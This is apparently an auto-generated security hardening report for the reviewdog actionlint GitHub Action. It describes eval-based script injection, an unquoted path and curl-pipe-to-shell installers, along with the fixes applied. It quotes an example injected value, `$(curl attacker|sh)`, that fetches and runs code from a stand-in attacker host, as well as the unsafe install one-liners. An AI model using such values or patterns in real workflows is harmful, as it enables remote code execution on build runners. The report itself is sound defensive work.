<!-- markdownlint-disable -->

# Hardening Report: reviewdog--action-actionlint/v1.84.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **reviewdog--action-actionlint/v1.84.0** was hardened automatically. 4 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (b): the entrypoint runs workflow-controlled inputs through eval. `eval "set -- ${INPUT_ACTIONLINT_FLAGS}"` (line 39) and `eval "set -- ${INPUT_REVIEWDOG_FLAGS}"` (line 54) take inputs.actionlint_flags and inputs.reviewdog_flags and have the shell evaluate them again. A value such as `$(curl attacker|sh)` or `; malicious` would run as a command. The Docker action's /entrypoint.sh and the dockerless composite step both reach these lines.

Locations:

- `entrypoint.sh:39`
- `entrypoint.sh:54`

### script-injection (severity: high)

Rule (b): the composite 'Run' step expands an env var unquoted. `run: $ACTION_PATH/../entrypoint.sh` uses ACTION_PATH, which comes from `${{ github.action_path }}`, without double quotes. It should be `"$ACTION_PATH/../entrypoint.sh"`.

Locations:

- `dockerless/action.yml:85`

### unsafe-shell (severity: high)

The script pipes remote content straight into a shell: `curl -sSL https://raw.githubusercontent.com/kjanat/actionlint/08bb2c4f.../scripts/download-actionlint.bash | bash -s -- "$ACTIONLINT_VERSION"`. It should download the script to a file and then run it separately. The composite step 'install actionlint' calls this script.

Locations:

- `scripts/install-actionlint.sh:18`

### unsafe-shell (severity: high)

The script pipes remote content straight into a shell: `curl -sSL https://raw.githubusercontent.com/reviewdog/reviewdog/df70ed74.../install.sh | sh -s -- -b "$INSTALL_DIR" "v$REVIEWDOG_VERSION"`. It should download the script to a file and then run it separately. The composite step 'install reviewdog' calls this script.

Locations:

- `scripts/install-reviewdog.sh:17`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, unsafe-shell

**Notes:**

entrypoint.sh: removed both `eval "set -- ${INPUT_*_FLAGS}"` lines. Each flags input is now split with the quote-aware xargs method into a bash array: there is an empty-value guard, a `xargs -r true` check that fails on an unmatched quote, and the built-in printf runs through `sh -c ... sh`. The flags are passed as ${arr[@]+"${arr[@]}"} so an empty array still works under set -u on bash 3.2. Quoted values like -ignore="foo bar" still come through as one argument, and nothing in the value gets evaluated. The shebang changed to #!/bin/bash. Bash is installed in the Dockerfile (apk add bash) and is on runners for the dockerless path. dockerless/action.yml: the Run step now quotes "$ACTION_PATH/../entrypoint.sh". install-actionlint.sh and install-reviewdog.sh: the installers are downloaded to mktemp files with curl -f, then run separately with the args unchanged and the pipe-form `-s --` dropped. action.yml: runs.image changed from the prebuilt upstream ghcr image to 'Dockerfile'. The prebuilt image ships upstream's eval-based /entrypoint.sh, so without this the Docker path would never use the fixed script. The Dockerfile's base image is already pinned by digest.

